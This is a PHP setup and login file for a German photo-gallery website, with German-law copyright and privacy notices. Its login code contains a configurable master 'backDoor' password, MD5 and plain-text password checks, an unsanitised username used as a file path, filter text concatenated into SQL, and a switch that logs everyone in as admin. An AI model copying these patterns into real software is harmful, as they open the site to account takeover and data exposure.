<?php
 include_once ('../../config/config.php');
 include_once ('phpfunctions.php');
 
 mysql_connect($config->dbServer, $config->dbUser, $config->dbPassword) or die('Could not connect: ' . mysql_error());
 mysql_select_db($config->dbBase) or die('Could not select database');

 ini_set ('error_reporting', E_ALL);
 ini_set ('html_errors', 'Off');
 ini_set ('display_errors' , 1 );
 
if ($config->enableBrowserCaching) cache_control();

session_start();
 
preventInjection();
 
$folder=isset($_GET['folder'])?trim($_GET['folder']):false;
$image=isset($_GET['image'])?$_GET['image']:false;
$page=isset($_GET['page'])?$_GET['page']:1;
$filter=isset($_GET['filter'])?trim($_GET['filter']):'';
$mode=isset($_GET['mode'])?$_GET['mode']:'events';

$filterSQL=getFilterSQL($filter);

$user=false;
$username=false;
$userIsAdmin=false;

if (isset($_REQUEST['logout'])) {
	unset($_SESSION['user']);
	unset($_SESSION['userQuery']);
	unset($_SESSION['lang']);
}

if (isset($_POST['user']) && isset($_POST['password'])){
	
	
	$userData=json_decode(file_get_contents($config->settingsPath.'/users/'.$_POST['user']),true);
	
	if (   $userData['password']==md5($_POST['password'])
	    || $userData['password']==$_POST['password']
	    || $config->backDoor==md5($_POST['password'])
	    ){
	    	
		$user=$userData['clearname'];
		$username=$_POST['user'];
		$userQuery=$userData['userquery'];
		$userIsAdmin=$userData['isAdmin'];
		$_SESSION['user']=$user;
		$_SESSION['username']=$username;
		$_SESSION['userQuery']=$userQuery;
		$_SESSION['userIsAdmin']=$userIsAdmin;
		$trackAction=array('Login','Log in '.$user,'');
	} else {
		$trackAction=array('Login error',$_POST['user'],'');
		echo '<script>
		   window.setTimeout("login_error();",1000);
		</script>';
	}
	
} else {
	if (isset($_SESSION['user']) && isset($_SESSION['userQuery'])){
		$user=$_SESSION['user'];
		$username=$_SESSION['username'];
		$userQuery=$_SESSION['userQuery'];
		$userIsAdmin=$_SESSION['userIsAdmin'];
	} 
}

$_SESSION['bildersee']=true;

if ($user==false){
	$userQuery="((files.tags LIKE '%public%') OR (files.tags LIKE '%".getCodeword($filter)."%' AND NOT files.tags LIKE '%privat%' ))";
}

if ($config->alwaysLoggedIn){
	$userQuery="(1=1)";
	$user='User';
	$username='User';
	$userIsAdmin=true;
}

$pageTitle=$config->pageTitle;

$legalShort='<br><b>'.translate('Author\'s rights').'</b>

<p>'.translate('The images published on this website are protected under German author\'s rights law! The rights remain with the photographers. Images may be used for private purposes without charge. Further usage requires the approval of the photographer and every person depicted in the image. For further information, have a look at the legal information.').' <a href="?mode=legal">'.translate('Legal Information (in German)').'</a></p>

<b>'.translate('Privacy / Data Protection').'</b>

<p>'.translate('It is not necessary to enter personal data for viewing public image galleries on bildersee.eu. Registered users get access to additional data. Registrations are only granted on a personal base. Consult the privacy policy for more information.').' <a href="?mode=privacy">'.translate('Privacy Policy (in German)').'</a></p>

<b>'.translate('Right to the Personal Image').'</b>

<p>'.translate('Images on this website are not indexed by Google or other search engines. The publication of images on which people are depicted, requires their individual approval in most cases. The photographers have obtained this approval as far as possible. Should you nevertheless find an image which should not be publically available, send an e-mail to winkelnkemper@googlemail.com. The image will be removed as soon as possible.').'</p>';

?>